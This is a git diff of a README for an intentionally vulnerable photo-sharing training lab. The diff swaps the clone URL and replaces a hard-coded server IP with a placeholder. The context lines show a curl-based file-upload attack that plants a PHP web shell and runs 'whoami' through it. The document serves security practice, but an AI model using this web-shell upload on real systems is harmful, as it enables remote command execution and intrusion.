@@ -7,7 +7,7 @@ This application is intentionally vulnerable. Never use in production.
 
 ## Quick Start
 ```bash
-git clone https://github.com/yourusername/photoshare-vulnerable-lab.git
+git clone https://github.com/pondoksiber/Photo_Share_Labs/photoshare-vulnerable-lab.git
 cd photoshare-vulnerable-lab
 chmod +x
 ./autodeploy.sh
@@ -21,7 +21,7 @@ Path traversal
 
 ## Basic Upload Test:
 bash
-curl -i 'http://139.162.33.5:3000/api/users/one/admin/photo' \
+curl -i 'http://<YOUR_VPS_IP>:3000/api/users/one/admin/photo' \
   -X PUT \
   -H 'authorization: AUTH_TOKEN' \
   -F "admin=@test.exe;filename=test.exe"
@@ -31,8 +31,8 @@ bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 curl -F "admin=@shell.php;filename=shell.php" \
   -H "authorization: AUTH_TOKEN" \
-  -X PUT http://139.162.33.5:3000/api/users/one/admin/photo
-curl 'http://139.162.33.5/uploads/shell.php?cmd=whoami'
+  -X PUT http://<YOUR_VPS_IP>:3000/api/users/one/admin/photo
+curl 'http://<YOUR_VPS_IP>/uploads/shell.php?cmd=whoami'
 
 ## Endpoints
 / - Main upload (secure)
